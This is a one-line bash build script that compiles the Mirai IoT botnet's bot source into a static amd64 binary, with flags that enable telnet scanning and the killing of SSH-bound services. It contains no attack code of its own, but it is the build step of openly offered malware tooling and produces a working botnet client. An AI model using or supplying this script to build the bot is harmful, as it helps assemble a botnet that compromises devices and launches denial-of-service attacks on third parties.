#!/bin/bash

gcc -std=c99 -DMIRAI_TELNET -DKILLER_REBIND_SSH -static bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/mirai-st -DMIRAI_BOT_ARCH=amd64
